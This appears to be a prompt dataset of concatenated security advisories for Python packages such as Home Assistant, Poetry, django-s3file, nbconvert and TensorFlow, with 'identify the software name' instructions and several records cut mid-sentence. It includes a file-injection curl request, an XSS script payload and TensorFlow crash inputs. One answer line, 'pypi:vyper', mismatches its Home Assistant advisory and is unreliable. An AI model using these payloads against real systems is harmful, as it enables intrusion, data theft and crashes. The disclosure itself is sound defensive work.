password credentials grant (ROPCG) flow, the correct remote account password) to renew tokens if they expire or are reset. The proxy's token retrieval implementation was created with this interactive process in mind.\n\nThe CCG flow is an administrator-level method that grants broad access without user knowledge or consent \u2013 no user interaction (or remote account password) is ever required. From 8c874c2ff3d503ac20c7d32f46e08547fcb9e23f until the fix in eaaa1a2e7a132bf0958dd2f99a749ad98e3212aa, when CCG tokens neared their expiry date (or had already expired), and the original unencrypted `client_secret` value was available they were automatically reset, renewed and encrypted with the given login password, but without checking whether that password was actually able to decrypt the _existing_ token.\n\n\n### Detecting unauthorised access\nIf you do not use the OAuth 2.0 CCG flow (which is currently only known to be supported by O365), unauthorised account access was not possible.[^1] Attempts to exploit this flaw will be revealed in the same way as any other malicious access: an unexpected reauthorisation prompt from the proxy when trying to log in with the legitimate account details.\n\nWhen using the CCG flow, if you have set `delete_account_token_on_password_error = False`, unauthorised access will be revealed by the presence of an unexpected login failure from the proxy when attempting to log in with the correct password.\n\nIt you have not set this value, it is not possible to detect unauthorised access in O365 CCG mode except via AAD/Entra or other external logs. However, it is also worth reiterating that the CCG flow should never be used in a publicly-accessible context due to the significant and potentially dangerous account control it provides.\n\n[^1]: If you are using a provider that does not provide an OAuth 2.0 refresh token (or have configured your account's scope so that this is not present), it is possible to trigger the line of code that caused this issue, but there is no way to use it for account access because interactive authentication is still required..

Please identify the software name affected by it. Input: ### Summary\n\nThe login page discloses all active user accounts to any unauthenticated browsing request originating on the Local Area Network.\n\n### Details\n\nStarting the [Home Assistant 2023.12 release](https://www.home-assistant.io/blog/2023/12/06/release-202312/), the login page returns all currently active user accounts to browsing requests from the Local Area Network. Tests showed that this occurs when:\n\n- The request is not authenticated and\n- The request originated locally, meaning on the Home Assistant host local subnet or any other private subnet (`10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, fd00::/8, ::ffff:10.0.0.0/104, ::ffff:172.16.0.0/108, ::ffff:192.168.0.0/112`)\n\nThe rationale behind this is to make the login more user-friendly (see [release blog post](https://www.home-assistant.io/blog/2023/12/06/release-202312/)) and an experience better aligned with other applications that have multiple user-profiles.\n\nHowever, as a result, all accounts are displayed regardless of them having logged in or not and for any device that navigates to the server. This disclosure is mitigated by the fact that it only occurs for requests originating from a LAN address. But note that this applies to the local subnet where Home Assistant resides and to any private subnet that can reach it.\n\n### PoC\n\n1. Place a Home Assistant instance on a private subnet, i.e., 192.168.1.0/24.\n2. Create a few users, let's say, three.\n3. From any (or another) private subnet on the LAN, like 192.168.2.0/24, open an incognito browser window (to ensure that the browser has no cookies from Home Assistant and therefore is demonstrably unauthenticated) and navigate to the Home Assistant URL.\n4. The login page will display all three users, including their profile photo.\n\n### Impact\n\nThe following CVSS string could be shaped to describe the overall impact of this issue:\nAV:A/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N\n\nAs seen, the Exploitability metrics are high, and the Impact metrics are low. This is fitting because the problem does not constitute a critical one, but at the same time, it is trivial to exploit. Still, since the mitigation can be so easily implemented in code to eliminate a typical case of information disclosure, it would certainly be worth pursuing.\n. Top 1 search result is pypi:vyper.

A nonscalar `id` can trigger a `CHECK` failure and crash the program.\n```python\nimport numpy as np\nimport tensorflow as tf\n\n# `id` is not scalar\ntf.raw_ops.UnbatchGrad(original_input= tf.constant([1]),batch_index=tf.constant([[0,0,0 ], ], dtype=tf.int64),grad=tf.constant([1,]),id=tf.constant([1,1,], dtype=tf.int64))\n```\nIt also requires its argument `batch_index` to contain three times the number of elements as indicated in its `batch_index.dim_size(0)`. An incorrect `batch_index` can trigger a `CHECK` failure and crash the program.\n```python\nimport numpy as np\nimport tensorflow as tf\n\n# batch_index's size is not 3\ntf.raw_ops.UnbatchGrad(original_input= tf.constant([1]),batch_index=tf.constant([[0,0], ], dtype=tf.int64),grad=tf.constant([1,]),id=tf.constant([1,], dtype=tf.int64))\n```\n\n### Patches\nWe have patched the issue in GitHub commit [5f945fc6409a3c1e90d6970c9292f805f6e6ddf2](https://github.com/tensorflow/tensorflow/commit/5f945fc6409a3c1e90d6970c9292f805f6e6ddf2).\n\nThe fix will be included in TensorFlow 2.10.0.

Please identify the software name affected by it. Input: ### Impact\n\nThe function `_verify_root_self_signed()`, introduced in [v0.14.0](https://github.com/theupdateframework/tuf/releases/tag/v0.14.0), and which verifies self-signatures in a new root metadata file, counted multiple signatures by any new root key towards the new threshold. That is, any single new root key could theoretically provide enough signatures to meet the threshold for new key self-signatures required during root metadata update.\n\nA scenario where this attack could be relevant is amazingly unlikely in practice to the point where labeling this issue as a security advisory is potentially overstating the impact of the issue. Given that new root keys only become trusted by the client after a successful root metadata update, which also requires the quorum of signatures from old trusted root keys, this issue has been evaluated as low in severity.\n\nIn particular, in order to exploit this vulnerability, an attacker must:\n\n1. Control one new root key.\n2. Craft a new root metadata file such that there is a number of signatures by this new root key greater than or equal to the new threshold.\n3. Cause a valid threshold of the old root keys to sign this new root metadata file.\n4. Cause this new root metadata file to be published on the repository.\n5. Cause clients to rotate to this new root metadata file.\n\n### Patches\nA [fix](https://github.com/theupdateframework/tuf/commit/83ac7be525b733f79a7e9bc573ec580ec835f179) is available since [version 0.16.0](https://github.com/theupdateframework/tuf/releases/tag/v0.16.0).\n\n### Workarounds\nNo workarounds are known for this issue.\n\n### References\n* Pull request resolving the issue [PR 1218](https://github.com/theupdateframework/tuf/pull/1218)\n* Pull request which introduced the faulty computation of signature threshold on new root metadata [PR 1101](https://github.com/theupdateframework/tuf/pull/1101)\n* A similar previous issue with incorrectly computed signature thresholds in tuf is described in [GHSA-pwqf-9h7j-7mv8](https://github.com/theupdateframework/tuf/security/advisories/GHSA-pwqf-9h7j-7mv8).

Please identify the software name affected by it. Input: ### Impact\n\nAn attacker can max out the number of client connections allowed by the ledger that was deployed using guidance provided in the indy-node repository, leaving the ledger unable to be used for its intended purpose.\n\nThe ledger content will not be impacted by the attack, and the ledger will resume servicing valid client requests after the attack.\n\n### Mitigations\n\nThis attack exploits the trade-off between resilience and availability. Any protection against abusive client connections will also prevent the network being accessed by certain legitimate users. As a result, validator nodes must tune their firewall rules to ensure the right trade-off for their network's expected users. The guidance previously provided enabled a low-cost DDoS attack.\n\nThe [guidance to network operators for the use of firewall rules](https://github.com/hyperledger/indy-node/blob/main/docs/source/setup-iptables.md) in the deployment of Indy networks has been modified to better protect against denial of service attacks by increasing the cost and complexity in mounting such attacks.\n\nThe mitigation for this vulnerability is not in the Hyperledger Indy code per se, but rather in the individual deployments of Indy. The mitigations should be applied to all deployments of Indy, and are not related to a particular release.\n\n### Acknowledgements\n\nThank you to Mirko Mollik at [TrustCerts.de](https://trustcerts.de) for finding and responsibly disclosing this issue..

Please identify the software name affected by it. Input: The JWT code can auto-detect the type of token being provided, and this can lead the application to incorrect conclusions about the trustworthiness of the token.\nQuoting the private disclosure we received : \"Under certain circumstances, it is possible to substitute a [..] signed JWS with a JWE that is encrypted with the public key that is normally used for signature validation.\"\nThis substitution attack can occur only if the validating application also have access to the private key, normally used to sign the tokens, available during validation of the received JWT.\nThe significance of this attacks depends on the use of the token, it may lead to authentication bypass or authorization bypass (respectively if claims are used to authenticate or authorize certain actions), because the attacker has full control of the data placed in the JWE and can inject any desired claim value.\n\nSeveral mitigating factors exist that can protect applications from this issue:\n- If the private key corresponding to the public key used to encrypt the JWE is not available to the application an exception will be raised.\n- If the JWK is specified with the 'use' parameter set to 'sig' (as expected for keys used only for signing/verification) an exception will be raised.\n- If the JWK is specified with the 'key_ops' parameter set and it does not include the 'decrypt' operation an exception will be raised.\n- Applications may check the token type before validation, in this case they would fail to detect an expected JWS\n\nNormally, signing and validation are done by different applications, so this scenario should be unlikely. However it is possible to have applications that both sign and validate tokens and do not separate JWKs in use, or do not set a JWK 'use' type.\n\nDue to the mitigating factors, and the fact that specific operational constraints and conditions need to be in place to successfully exploit this issue to generate an authentication bypass, we rate this security issue as moderate. Other avenues may decide on a different rating based on use case, always verify what conditions apply to your use of the library to assess risk.\n\nMany thanks to Tom Tervoort of Secura for finding and reporting this issue.\n.

Please identify the software name affected by it. Input: ### Observation\n\nWhen handling dependencies that come from a Git repository instead of a registry, Poetry uses various commands, such as `git clone`. These commands are being constructed using user input (e.g. the repository URL). When building the commands, Poetry correctly avoids Command Injection vulnerabilities by passing an array of arguments instead of a command string. However, there is the possibility that a user input starts with a dash (`-`) and is therefore treated as an optional argument instead of a positional one. This can lead to Code Execution because some of the commands have options that can be leveraged to run arbitrary executables.\n\nTo clone a repository, Poetry builds a git clone command, but fails to validate or sanitize the repository location properly:\n\n[`poetry/core/vcs/git.py`](https://github.com/python-poetry/poetry-core/blob/ad33bc2f92be03dc5b31a666664903c439fb1173/poetry/core/vcs/git.py#L207):\n\n```python\ndef clone(self, repository: str, dest: Path) -> str:\n    return self.run(\"clone\", \"--recurse-submodules\", repository, str(dest))\n```\n\nSince this value comes from the `pyproject.toml` file, it can contain any character, including a leading dash.\n\n### Impact\n\nThis vulnerability can lead to Arbitrary Code Execution, which would lead to the takeover of the system. If a developer is exploited, the attacker could steal credentials or persist their access. If the exploit happens on a server, the attackers could use their access to attack other internal systems.\nSince this vulnerability requires a fair amount of user interaction, it is not as dangerous as a remotely exploitable one. However, it still puts developers at risk when dealing with untrusted files in a way they think is safe, because the exploit still works when the victim tries to make sure nothing can happen, e.g. by vetting any Git or Poetry config files that might be present in the directory.\nThis kind of attack vector has been used in the past to target security researchers by sending them projects to collaborate on, so we believe that there is a non-negligible risk.\n\n### Patches\n\n1.1.8 || 1.2.0b1\n\n### Remediation\n\nUpgrade to version 1.1.9 || 1.2.0b1\n\n### References\n\n[Fix PR](https://github.com/python-poetry/poetry-core/pull/202)\n\n### For more information\nIf you have any questions or comments about this advisory, email us at [security@python-poetry.org](mailto:security@python-poetry.org)\n.

Input: The `xml.etree.ElementTree` module that mofh used up until version `1.0.1` implements a simple and efficient API for parsing and creating XML data. But it makes the application vulnerable to:\n\n- [Billion Laughs attack](https://en.wikipedia.org/wiki/Billion_laughs_attack): It is a type of denial-of-service attack aimed at XML parsers. It uses multiple levels of nested entities. If one large entity is repeated with a couple of thousand chars repeatedly, the parser gets overwhelmed.  \n- [Quadratic blowup attack](https://www.acunetix.com/vulnerabilities/web/xml-quadratic-blowup-denial-of-service-attack/): It is similar to a Billion Laughs attack. It abuses entity expansion, too. Instead of nested entities, it repeats one large entity with a couple of thousand chars repeatedly.\n\nThe Problem has been patched starting from version `1.0.1` by utilising the `defusedxml` package instead of `xml.etree.ElementTree`.\n\n### Workarounds\nFor this vulnerability to be exploited the user must be using a custom API URL, which has to be manually given using the `api_url` argument, or MyOwnFreeHost's API must be hacked. So, if the user did not use a custom API URL they _should_ be fine, however, upgrading is still advised.\n\nAnother workaround could be to call `defusedxml.defuse_stdlib()` before making any requests using the client..

This is probably by design, however, it would be nice to enable an option which uses an HTML sanitizer preprocessor to strip down all javascript elements:\n\nThe following is an example of a `markdown` cell executing arbitrary javascript code:\n\n```json\n  {\n   \"cell_type\": \"markdown\",\n   \"id\": \"2d42de4a\",\n   \"metadata\": {},\n   \"source\": [\n     \"<script>alert(1)</script>\"\n   ]\n  },\n```\n\n### Proof of Concept\n\nThese vulnerabilities may affect any server using nbconvert to generate HTML and not using a secure content-security-policy (CSP) policy. For example [nbviewer](https://nbviewer.jupyter.org) is vulnerable to the above mentioned XSS issues:\n\n1. Create Gist with payload. eg:\n- `https://gist.github.com/pwntester/ff027d91955369b85f99bb1768b7f02c`\n\n2. Then load gist on nbviewer. eg:\n- `https://nbviewer.jupyter.org/gist/pwntester/ff027d91955369b85f99bb1768b7f02c`\n\nNote: response is served with `content-security-policy: connect-src 'none';`\n\n## GitHub Security Advisories\n\nWe recommend you create a private [GitHub Security Advisory](https://help.github.com/en/github/managing-security-vulnerabilities/creating-a-security-advisory) for these findings.

Input: ### Impact\nUsers hosting Streamlit app(s) that use custom components are vulnerable to a directory traversal attack that could leak data from their web server file-system such as: server logs, world readable files, and potentially other sensitive information.\n\nAn attacker can craft a malicious URL with file paths and the streamlit server would process that URL and return the contents of that file.\n\n### Patches\nOn July 27th at 2:20PM PST we rolled out a patch in release 1.11.1. This patch ensures that any file operations are restricted only to the custom component directory and cannot traverse outside of that. We strongly recommend users upgrade to v1.11.1 as soon as possible. We have notified the Streamlit community and popular hosting providers about this issue so they can patch quickly. As a precautionary measure, we are also upgrading all users on Streamlit Cloud wherever possible. We continue to check other occurrences of this vulnerability and monitor potential exploits wherever we can.\n\nFinally, as a general security practice, we recommend users review custom components for any malicious code before using them in their apps. Following security best practices such as running web servers with low privileges, firewalls, etc. for hosting your apps, helps in mitigating the severity of such exploits.\n\n### Workarounds\nNone.\n\n### References\n* https://docs.google.com/document/d/e/2PACX-1vRzF9K6gwv9KnQz---1pt0SdHMVt-CHuKMmdTH1uct7xPcK7vToP4FvYdI84aO6rGfCmrBSaViri0Nd/pub\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Email us at [security@streamlit.io](mailto:security@streamlit.io)\n.

Who is impacted?_\n\nAuthenticated requests to the notebook server with `ContentsManager.allow_hidden = False` only prevented listing the contents of hidden directories, not accessing individual hidden files or files in hidden directories (i.e. hidden files were 'hidden' but not 'inaccessible'). This could lead to notebook configurations allowing authenticated access to files that may reasonably be expected to be disallowed.\n\nBecause fully authenticated requests are required, this is of relatively low impact. But if a server's root directory contains sensitive files whose only protection from the server is being hidden (e.g. `~/.ssh` while serving $HOME), then any authenticated requests could access files if their names are guessable. Such contexts also necessarily have full access to the server and therefore execution permissions, which also generally grants access to all the same files. So this does not generally result in any privilege escalation or increase in information access, only an additional, unintended _means_ by which the files could be accessed.\n\n### Patches\n_Has the problem been patched?

Please identify the software name affected by it. Input: ### Impact\n\nIt was possible to traverse the entire AWS S3 bucket and in most cases to access or delete files.\nThe issue was discovered by the maintainer. There were no reports of the vulnerability\nbeing known to or exploited by a third party, before the release of the patch.\n\nIf the `AWS_LOCATION` setting was set, traversal was limited to that location only.\nIf all your files handling views (like form views) require authentication or special permission, the thread is limited to privileged users.\n\n### Patches\n\nThe vulnerability has been fixed in version 5.5.1 and above.\n\n### Workarounds\n\nThere is no feasible workaround. We must urge all users to immediately updated to a patched version.\n\n### Detailed attack vector description\n\nAn attacker may use a request with malicious form data to traverse the entire AWS S3 bucket and perform destructive operations.\n\nAn attack could look as follows:\n```bash\ncurl -X POST -F \"s3file=file\" -F \"file=/priviliged/location/secrets.txt\" https://www.example.com/any/path/will/work/\n```\n\nThis will result in a request with files set and opened:\n\n```python\n>>> request.FILES.getlist(\"file\")\n[File(\"/priviliged/location/secrets.txt\")]\n```\n\nSince this behavior is injected via a middleware, any view can be called this way and will carry any files defined by the attacker.\n\nVia the `s3file` form field, any input name can be specified, including multiple inputs. For each input, multiple files can be freely\npicked of the S3 bucket.\n\n#### Scenarios and their practicality\n\nThere are four scenarios that would be considered practical in most setups:\n\n1. Illegal file injection,\n2. file deletion,\n3. file retrieval & tree traversal.\n4. code injection & remote code execution.\n\n##### File deletion\n\nAn attacker knows the location of a privileged file, like a static asset. Next, the file is injected into a form view. The upload to function will move the file to a new location. This is effectively deleting the file, since the previous references to it are invalid, and will cause S3 to return a 404. Furthermore, the new location is unknown to the site operator.\n\n##### File retrieval & tree traversal\n\nAn attacker knows the URL of a secret file and injects it into a form view. The view will move the file to a public location, making it accessible to the attacker. Since most form views will not be rate limited, this could also be used to guess files and traverse the file tree.\n\n##### Illegal file injection\n\nAn attacker uses any form to upload a file to the temporary upload location. Next, the attacker injects that file into a request, does not validate the contents or is not equipped to handle the mime type. The latter could be used as a potential DOS vector.\n\nIn practice, this is not a practical risk in most hardened setup. Files should always be sanitized before processing, since files can be included in a request even without this security issues.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue on [GitHub](https://github.com/codingjoe/django-s3file/issues)\n* Email us at [johannes@maron.family](mailto:johannes@maron.family)\n.

Please identify the software name affected by it. Input: # Background\n\nCILogon is a federated auth provider that allows users to authenticate\nthemselves via a number of Identity Providers (IdP), focused primarily on educational and\nresearch institutions (such as Universities). More traditional and open IdPs\nsuch as GitHub, ORCID, Google, Microsoft, etc are also supported.\n\nCILogonOAuthenticator is provided by the OAuthenticator package, and lets users log\nin to a JupyterHub via CILogon. This is primarily used to restrict a JupyterHub\nonly to users of a given institute. The allowed_idps configuration trait of\nCILogonOAuthenticator is documented to be a list of domains that indicate the\ninstitutions whose users are authorized to access this JupyterHub. This authorization\nis validated by ensuring that the *email* field provided to us by CILogon has a\n*domain* that matches one of the domains listed in `allowed_idps`.\n\n# Impact\n\nIf `allowed_idps` contains `berkeley.edu`, you might expect only users with valid\ncurrent credentials provided by University of California, Berkeley to be able to\naccess the JupyterHub. However, CILogonOAuthenticator does *not* verify which provider\nis used by the user to login, only the email address provided. So a user can login\nwith a GitHub account that has email set to `<something>@berkeley.edu`, and that will\nbe treated exactly the same as someone logging in using the UC Berkeley official\nIdentity Provider. This has two consequences:\n\n1. Since GitHub (and most other providers we tested) only require you to verify\n   your email once, a user can access a JupyterHub even if their access to\n   the institution's IdP has been revoked or expired.\n2. CILogon supports hundreds of identity providers - if even one of them allows\n   users to set any email ids without verifying, that can be used to impersonate\n   *any* user on any other identity provider! While CILogon itself has a stellar\n   security record, this particular method of doing authorization means an attacker\n   would only need to compromise a single identity provider to compromise all of\n   CILogon\n\nWe currently do not know of any identity provider that provides *unverified*\nemail addresses to CILogon, so this is not a severe known vulnerability. However,\nthere are hundreds of IdPs, and we could not try them all.\n\n# Patches\n\nThis patch makes a *breaking change* in how `allowed_idps` is interpreted. It's\nno longer a list of domains, but configuration representing the `EntityID` of the\nIdPs that are allowed, picked from the [list maintained by CILogon](https://cilogon.org/idplist/).\nSo instead of `berkeley.edu`, you would specify `urn:mace:incommon:berkeley.edu` to\nallow logins from users currently with `berkeley.edu` accounts. GitHub users\nwith a verified `berkeley.edu` email will no longer be allowed to log in.\n\nFor details on how to transition your CILogonOAuthenticator configuration to the patched version 15.0.0 or above, see [the migration](https://oauthenticator.readthedocs.io/en/latest/migrations.html) documentation..

Input: The Twisted Web HTTP 1.1 server, located in the `twisted.web.http` module, parsed several HTTP request constructs more leniently than permitted by RFC 7230:\n\n1. The Content-Length header value could have a `+` or `-` prefix.\n2. Illegal characters were permitted in chunked extensions, such as the LF (`\\n`) character.\n3. Chunk lengths, which are expressed in hexadecimal format, could have a prefix of `0x`.\n4. HTTP headers were stripped of all leading and trailing ASCII whitespace, rather than only space and HTAB (`\\t`).\n\nThis non-conformant parsing can lead to desync if requests pass through multiple HTTP parsers, potentially resulting in HTTP request smuggling.\n\n### Impact\n\nYou may be affected if:\n\n1. You use Twisted Web's HTTP 1.1 server and/or proxy\n2. You also pass requests through a different HTTP server and/or proxy\n\nThe specifics of the other HTTP parser matter. The original report notes that some versions of Apache Traffic Server and HAProxy have been vulnerable in the past. HTTP request smuggling may be a serious concern if you use a proxy to perform request validation or access control.\n\nThe Twisted Web client is not affected.

This may have allowed adversaries to retrieve some of these hashes, perform a brute-force search for the clear-text passphrase, and use these to make unauthorised changes to affected IRR objects. This issue only affected instances that process password hashes, which means it is limited to IRRd instances that serve authoritative databases. IRRd instances operating solely as mirrors of other IRR databases are not affected.\n\nThe issue occurred:\n* For `mntner` objects where all password hash names (`MD5-PW` and `CRYPT-PW`) were in lower or mixed case in the `auth` attribute. For these objects, hashes remained in the output of all queries of any method and all database exports made with the `export_destination` setting. Fortunately, objects in the common public IRR database virtually all use uppercase hash names which means very few of those objects were affected.\n* For any GraphQL queries that queried the `auth` field on `mntner` objects.\n* For any GraphQL queries that queried the `objectText` field on the `journal` field on `mntner` objects, if the `nrtm_access_list` setting permitted journal access.\n\nThe two GraphQL cases are visible in logs, allowing users to determine whether any existing objects had their hashes exposed.\nThis has been fixed in IRRd 4.2.3 and the main branch. Versions in the 4.1.x series never were affected. Users of the 4.2.x series are strongly recommended to upgrade. All users running a more recent version from the main branch should update to the latest version. Alternatively, but not recommended, apply the patch manually [for 4.2.x].

Connections will only be terminated after `max_spider_size` (default: 10M) bytes have been downloaded, which can in some cases lead to long-lived connections towards the streaming media server (for instance, Icecast).\n\nThis can cause excessive traffic and connections toward such servers if their stream URL is, for example, posted to a large room with many Synapse instances with URL preview enabled.\n\n### Patches\n1.52.0 implements a timeout mechanism which will terminate URL preview connections after 30 seconds. Since generating URL previews for media streams is not supported and always fails, 1.53.0 additionally implements an allow list for content types for which Synapse will even attempt to generate a URL preview.\n\nWe recommend upgrading to 1.53.0 to fully resolve the issue.\n\n### Workarounds\nTurn off URL preview functionality by setting `url_preview_enabled: false` in the Synapse configuration file.\n\n### References\n- Patch (timeout): https://github.com/matrix-org/synapse/pull/11784\n- Patch (content type allow list): https://github.com/matrix-org/synapse/pull/11936\n\n### For more information\nIf you have any questions or comments about this advisory, e-mail us at security@matrix.org.\n.

Input: ### Impact\n\nIf you manually define cookies on a [`Request`](https://docs.scrapy.org/en/latest/topics/request-response.html#scrapy.http.Request) object, and that `Request` object gets a redirect response, the new `Request` object scheduled to follow the redirect keeps those user-defined cookies, regardless of the target domain.\n\n### Patches\n\nUpgrade to Scrapy 2.6.0, which resets cookies when creating `Request` objects to follow redirects\u00b9, and drops the ``Cookie`` header if manually-defined if the redirect target URL domain name does not match the source URL domain name\u00b2.\n\nIf you are using Scrapy 1.8 or a lower version, and upgrading to Scrapy 2.6.0 is not an option, you may upgrade to Scrapy 1.8.2 instead.\n\n\u00b9 At that point the original, user-set cookies have been processed by the cookie middleware into the global or request-specific cookiejar, with their domain restricted to the domain of the original URL, so when the cookie middleware processes the new (redirect) request it will incorporate those cookies into the new request as long as the domain of the new request matches the domain of the original request.\n\n\u00b2 This prevents cookie leaks to unintended domains even if the cookies middleware is not used.\n\n### Workarounds\n\nIf you cannot upgrade, set your cookies using a list of dictionaries instead of a single dictionary, as described in the [`Request` documentation](https://docs.scrapy.org/en/latest/topics/request-response.html#scrapy.http.Request), and set the right domain for each cookie.\n\nAlternatively, you can [disable cookies altogether](https://docs.scrapy.org/en/latest/topics/downloader-middleware.html#std-setting-COOKIES_ENABLED), or [limit target domains](https://docs.scrapy.org/en/latest/topics/spiders.html#scrapy.spiders.Spider.allowed_domains) to domains that you trust with all your user-set cookies.\n\n### References\n* Originally reported at [huntr.dev](https://huntr.dev/bounties/3da527b1-2348-4f69-9e88-2e11a96ac585/)\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n* [Open an issue](https://github.com/scrapy/scrapy/issues)\n* [Email us](mailto:opensource@zyte.com).

Please identify the software name affected by it. Input: ### Impact\nHTTPie have the practical concept of [sessions](https://httpie.io/docs/cli/sessions), which help users to persistently store some of the state that belongs to the outgoing requests and incoming responses on the disk for further usage. As an example, we can make an authenticated request and save it to a [named session](https://httpie.io/docs/cli/named-sessions) called `api`:\n\n```bash\n$ http --session api -a user:pass pie.dev/basic-auth/user/pass\n```\n\n```json\n{\n    \"authenticated\": true,\n    \"user\": \"user\"\n}\n```\n\nSince we have now saved the authentication data to that session, we won\u2018t have to enter it again and again on every invocation. We can simply reference the session, and HTTPie will use the saved state directly from it:\n\n```bash\n$ http --session api pie.dev/basic-auth/user/pass\n```\n\n```json\n{\n    \"authenticated\": true,\n    \"user\": \"user\"\n}\n```\n\nOne particular use case of these sessions is storing cookies (commonly referred to as a `Cookie Jar`). If a response has a `Set-Cookie`\nheader, HTTPie will parse it and store the actual cookie in the session. And from that point on, all outgoing requests will attach that cookie (in the form of a `Cookie` header).\n\nThis is extremely useful, especially when you are dealing with websites which manage their own state on the client-side through cookies.\n\n```bash\n$ http -F --session jar pie.dev/cookies/set/x/y\n```\n\n```json\n{\n    \"cookies\": {\n        \"x\": \"y\"\n    }\n}\n```\n\nBefore `3.1.0`, HTTPie didn\u2018t distinguish between cookies and hosts they belonged. This behavior resulted in the exposure of some cookies when there are redirects originating from the actual host to a third party website, e.g:\n\n```bash\n$ http -F --session jar pie.dev/redirect-to url==https://httpbin.org/cookies\n```\n\n(Pre 3.1.0)\n```json\n{\n    \"cookies\": {\n        \"x\": \"y\"\n    }\n}\n```\n\n(Post 3.1.0)\n```json\n{\n    \"cookies\": {}\n}\n```\n\nThis behavior has been corrected in this release (with taking [RFC 6265 \u2014 HTTP State Management Mechanism](https://datatracker.ietf.org/doc/html/rfc6265) into the consideration).\n\nA huge credit goes to [@Glyph](https://github.com/glyph) for disclosing the original vulnerability to us (through [huntr.dev](http://huntr.dev/)).\n\n### Patches\nWe suggest users to upgrade their HTTPie version to `3.1.0` or higher, and run `httpie cli sessions upgrade` command on their sessions.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Email us: [`security@httpie.io`](mailto:security@httpie.io)\n\n> Please note that this entry is covered by both [CVE-2022-24737](https://www.cvedetails.com/cve/CVE-2022-24737) and [CVE-2022-0430](https://nvd.nist.gov/vuln/detail/CVE-2022-0430).\n.

Input: ### Description\n\nNVIDIA NeMo contains a vulnerability in ASR WebApp, where Relative Path Traversal (CWE-23) may lead to deletion of any directory through the \"../\" structure when admin privileges are available.\n\nCVSS Score = 2.0\nhttps://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:L/AC:L/PR:H/UI:R/S:U/C:N/I:L/A:N\n\n### Impact\nWhen the optional tool ASR Webapp (https://github.com/NVIDIA/NeMo/tree/main/tools/asr_webapp) is used prior to commit https://github.com/NVIDIA/NeMo/commit/f7e4ed7e4f7f2fa43765a38c2fafa1b6d1ebd7c0, some interfaces do not verify user input. Malicious attackers can construct malicious requests to delete any directory through the \"../\" structure.\n\nThe vulnerability affects only cases where this particular web app is started by a user with superuser permissions. The web application is *not* a part of the regular pip release or the corresponding container, and impacts only users that clone the repository in its entirety and execute the web app (while also possessing superuser permissions).\n\n## Patches\n\nThis vulnerability has been patched via https://github.com/NVIDIA/NeMo/commit/f7e4ed7e4f7f2fa43765a38c2fafa1b6d1ebd7c0, which is effectively any clone of the repository post r1.5.1 branch. Since the web app is not distributed via pip release or container, users who clone the main branch post this commit will possess the patch.\n\n### Workarounds\nThe changes in commit https://github.com/NVIDIA/NeMo/commit/f7e4ed7e4f7f2fa43765a38c2fafa1b6d1ebd7c0 can be applied to any version of the web app without any adverse effect.\n\n### Additional Information\nExploit Found on: 2021.12.16\nExploit Found by: @haby0\n\n.

This is [guarded by a `DCHECK`](https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/framework/full_type_util.cc#L104-L106):\n\n```cc\n  const auto* attr = attrs.Find(arg->s()); \n  DCHECK(attr != nullptr);\n  if (attr->value_case() == AttrValue::kList) {\n    // ...\n  }\n```\nHowever, `DCHECK` is a no-op in production builds and an assertion failure in debug builds. In the first case execution proceeds to the dereferencing of the null pointer, whereas in the second case it results in a crash due to the assertion failure.\n\n### Patches\nWe have patched the issue in GitHub commit [8a513cec4bec15961fbfdedcaa5376522980455c](https://github.com/tensorflow/tensorflow/commit/8a513cec4bec15961fbfdedcaa5376522980455c).\n\nThe fix will be included in TensorFlow 2.8.0.

Then, a value for `min_rank` is computed based on `concat_dim`. This is then used to validate that the `values` tensor has at least the required rank:\n\n```cc\n  int64_t concat_dim;\n  if (concat_dim_t->dtype() == DT_INT32) {\n    concat_dim = static_cast<int64_t>(concat_dim_t->flat<int32>()(0));\n  } else {\n    concat_dim = concat_dim_t->flat<int64_t>()(0);\n  }\n\n  // Minimum required number of dimensions.\n  const int min_rank = concat_dim < 0 ? -concat_dim : concat_dim + 1;\n\n  // ...\n  ShapeHandle input = c->input(end_value_index - 1);\n  TF_RETURN_IF_ERROR(c->WithRankAtLeast(input, min_rank, &input));\n```\n\nHowever, [`WithRankAtLeast`](https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/framework/shape_inference.cc#L345-L358) receives the lower bound as a 64-bits value and then compares it against the maximum 32-bits integer value that could be represented:\n\n```cc\nStatus InferenceContext::WithRankAtLeast(ShapeHandle shape, int64_t rank,\n                                         ShapeHandle* out) {\n  if (rank > kint32max) {\n    return errors::InvalidArgument(\"Rank cannot exceed kint32max\");\n  }\n  // ...\n}\n```\n\nDue to the fact that `min_rank` is a 32-bits value and the value of `axis`, the `rank` argument is a [negative value](https://godbolt.org/z/Gcr5haMob), so the error check is bypassed.\n\n### Patches\nWe have patched the issue in GitHub commit [08d7b00c0a5a20926363849f611729f53f3ec022](https://github.com/tensorflow/tensorflow/commit/08d7b00c0a5a20926363849f611729f53f3ec022).\n\nThe fix will be included in TensorFlow 2.8.0.

In the second case we also get a crash due to the assertion failure.\n### Patches\nWe have patched the issue in GitHub commit [cb164786dc891ea11d3a900e90367c339305dc7b](https://github.com/tensorflow/tensorflow/commit/cb164786dc891ea11d3a900e90367c339305dc7b).\n\nThe fix will be included in TensorFlow 2.8.0.

